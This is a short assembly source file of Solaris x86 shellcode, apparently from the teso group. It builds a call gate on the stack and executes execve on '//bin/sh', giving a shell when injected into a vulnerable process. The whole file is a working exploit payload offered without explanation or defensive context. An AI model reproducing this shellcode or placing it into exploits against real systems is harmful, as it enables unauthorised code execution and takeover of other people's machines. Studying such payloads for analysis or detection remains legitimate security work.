/* x86/solaris execve /bin/sh shellcode
 *
 * lorian / teso
 */
 
	.globl	cbegin
	.globl	cend

cbegin:
        movl      $0x3cfff8ff, %eax
	notl      %eax
	pushl     %eax
	xorl      %eax, %eax
	cdq
	movb      $0x9a, %al
	pushl     %eax
	movl      %esp, %edi
        
	movb      $0x3b, %al
	pushl     %edx
	push      $0x68732F6E
	push      $0x69622F2F
	movl      %esp, %ebx
	pushl     %edx
	pushl     %ebx
	movl      %esp, %ecx
	pushl     %edx
	pushl     %ecx
	pushl     %ebx
	call      *%edi

cend:
